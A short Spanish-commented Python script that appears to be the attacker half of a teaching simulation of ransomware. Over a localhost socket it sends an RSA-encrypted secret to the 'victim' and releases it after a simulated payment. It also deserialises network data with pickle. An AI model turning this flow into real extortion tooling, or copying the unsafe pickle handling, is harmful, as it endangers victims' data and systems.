import socket
import pickle
import random
from rsa_crypto import RSA

HOST = '127.0.0.1'
PORT = 65432

rsa = RSA()

print("=== ATACANTE - FASE DE ATAQUE ===")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST, PORT))
sock.listen(1)
print("⏳ Esperando conexión de la víctima...")

conn, addr = sock.accept()
print(f"✓ Víctima conectada desde {addr}")

# Recibir pk
pk_bytes = conn.recv(4096)
pk = pickle.loads(pk_bytes)
print(f"✓ Clave pública recibida")

# Generar y cifrar secreto 's'
(n, e) = pk
s = random.randint(1, n-1)
c = pow(s, e, n)
print(f"✓ Secreto 's' generado y GUARDADO: {s}")

# Enviar 'c'
c_bytes = pickle.dumps(c)
conn.sendall(c_bytes)
print(f"✓ Cifrado 'c' enviado a la víctima")

print("\n🔒 Víctima cifrando archivos...")
print("💰 Esperando 'pago'...\n")

# Esperar "pago" de victima
input("Presiona ENTER cuando la víctima 'pague' para enviar el secreto...")

print("\n=== FASE DE RECUPERACIÓN ===")
print("💸 Pago recibido. Enviando secreto 's'...")

# Enviar 's' por LA MISMA CONEXIÓN
s_bytes = pickle.dumps(s)
conn.sendall(s_bytes)
print(f"✓ Secreto 's' enviado. La víctima puede recuperar archivos.")

conn.close()
sock.close()
print("✓ Conexión cerrada")